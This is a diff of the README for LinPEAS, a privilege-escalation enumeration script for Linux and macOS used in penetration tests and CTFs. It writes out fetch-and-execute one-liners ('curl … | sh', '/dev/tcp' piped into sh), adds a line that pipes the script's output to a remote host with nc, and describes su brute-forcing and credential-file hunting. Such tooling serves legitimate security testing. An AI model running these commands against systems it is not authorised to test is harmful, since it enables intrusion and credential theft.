@@ -1,8 +1,9 @@
 # LinPEAS - Linux Privilege Escalation Awesome Script 
+[![CI-master_test](https://github.com/carlospolop/PEASS-ng/actions/workflows/CI-master_tests.yml/badge.svg)](https://github.com/carlospolop/PEASS-ng/actions/workflows/CI-master_tests.yml)
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
 
-**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\* hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)**
+**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)**
 
 Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**.
 
@@ -17,17 +18,21 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 
 ```bash
 #Local network
-sudo python -m SimpleHTTPServer 80
-curl 10.10.10.10/linpeas.sh | sh
+sudo python -m SimpleHTTPServer 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
 
 #Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh
-cat < /dev/tcp/10.10.10.10/80 | sh
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+#Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out #Host
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
 ```
 
 ```bash
 #Output to file
-linpeas -a > /dev/shm/linpeas.txt
+./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
 less -r /dev/shm/linpeas.txt #Read with colors
 ```
 
@@ -44,7 +49,9 @@ sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
-**Use the parameter `-a` to execute all these checks.**
+## MacPEAS
+
+Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed!!**
 
 ## Basic Information
 
@@ -56,7 +63,7 @@ It uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the bina
 
 By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.
 
-By default linpeas takes around **2 mins** to complete, but It could take from **4 to 5 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
+By default linpeas takes around **4 mins** to complete, but It could take from **5 to 10 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
 - From less than 1 min to 2 mins to make almost all the checks
 - Almost 1 min to search for possible passwords inside all the accesible files of the system
 - 20s/user bruteforce with top2000 passwords *(need `-a`)* - Notice that this check is **super noisy**
@@ -66,10 +73,11 @@ By default linpeas takes around **2 mins** to complete, but It could take from *
 - **-a** (all checks) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
 - **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
 - **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
+- **-v** (verbose) - Print information about the checks that haven't discovered anything and about the time each check took
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
-LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable. It also **exports and unset** some environmental variables during the execution so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
+LinPEAS also **exports a new PATH** variable during the execution if common folders aren't present in the original PATH variable.
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/help.png)
 
@@ -138,9 +146,9 @@ Here you have an old linpe version script in one line, **just copy and paste it*
 
 **The color filtering is not available in the one-liner** (the lists are too big)
 
-This one-liner is deprecated (I am not going to update it more), but it could be useful in some cases so it will remain here:
+This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.
 
-The default file where all the data is recorded is: */tmp/linPE* (you can change it at the beginning of the script)
+The default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)
 
 
 ```sh
@@ -153,6 +161,7 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
 - **System Information**
   - [x] SO & kernel version 
   - [x] Sudo version
+  - [x] USBCreator PE
   - [x] PATH
   - [x] Date
   - [x] System stats
@@ -203,46 +212,7 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Password policy
 
 - **Software Information**
-  - [x] MySQl (Version, user being configured, loging as "root:root","root:toor","root:", user hashes extraction via DB and file, possible backup user configured, credentials in config, cmd exec library)
-  - [x] PostgreSQL (Version, try login in "template0" and "template1" as: "postgres:", "psql:", file DBs, Config)
-  - [x] Apache (Version)
-  - [x] PHP cookies
-  - [x] Wordpress (Database credentials)
-  - [x] Tomcat (Credentials)
-  - [x] Mongo (Version, Credentials)
-  - [x] Supervisor (Credentials)
-  - [x] Cesi (Credentials)
-  - [x] Rsyncd (Credentials)
-  - [x] Hostapd (Credentials)
-  - [x] Wifi (Credentials)
-  - [x] Anaconda-ks (Credentials)
-  - [x] VNC (Credentials)
-  - [x] LDAP database (Credentials)
-  - [x] Open VPN files (Credentials)
-  - [x] SSH (private keys, known_hosts, authorized_hosts, authorized_keys, main config parameters in sshd_config, certificates, agents)
-  - [X] PAM-SSH (Unexpected "auth" values)
-  - [x] Cloud Credentials (credenals-AWS-, credentials.gb-GC-, legacy_credentials-GC-, access_tokens.db-GC-, accessTokens.json-Azure-, azureProfile.json-Azure-)
-  - [x] NFS (privilege escalation misconfiguration)
-  - [x] Kerberos (configuration & tickets in /tmp)
-  - [x] Kibana (credentials)
-  - [x] Logstash (Username and possible code execution)
-  - [x] Elasticseach (Config info and Version via port 9200)
-  - [x] Vault-ssh (Config values, secrets list and .vault-token files)
-  - [x] screen and tmux sessions
-  - [x] Couchdb
-  - [x] Redis
-  - [x] Dovecot
-  - [x] Mosquitto
-  - [x] Neo4j
-  - [x] Cloud-Init
-  - [x] Erlang Cookie
-  - [X] GVM config
-  - [x] IPSEC files
-  - [x] IRSSI config file
-  - [x] Keyring files
-  - [x] Filelliza files
-  - [x] Backup-manager
- 
+  - [x] Check out [sensitive_files.yaml](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/build_lists/sensitive_files.yaml)
 
 - **Generic Interesting Files**
   - [x] SUID & SGID files
@@ -281,24 +251,19 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Generic hashes MD5, SHA1, SHA256, SHA512
 </details>
 
-## Let's improve PEASS together
-
-If you want to **add something** and have **any cool idea** related to this project, please let me know it in the **telegram group https://t.me/peass** or using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)** and we will update the master version.
-
 ## Please, if this tool has been useful for you consider to donate
 
-[![Buy me a coffee](https://camo.githubusercontent.com/031fc5a134cdca5ae3460822aba371e63f794233/68747470733a2f2f7777772e6275796d6561636f666665652e636f6d2f6173736574732f696d672f637573746f6d5f696d616765732f6f72616e67655f696d672e706e67)](https://www.buymeacoffee.com/carlospolop)
+[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.patreon.com/peass)
 
-## Looking for a useful Privilege Escalation Course?
+## PEASS Style
 
-Contact me and ask about the **Privilege Escalation Course** I am preparing for attackers and defenders (**100% technical**).
+Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas
 
 ## TODO
 
 - Add more checks
 - Mantain updated the list of vulnerable SUID binaries
 - Mantain updated all the blacklists used to color the output
-- Support for MacOS
 
 If you want to help with any of this, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.
 
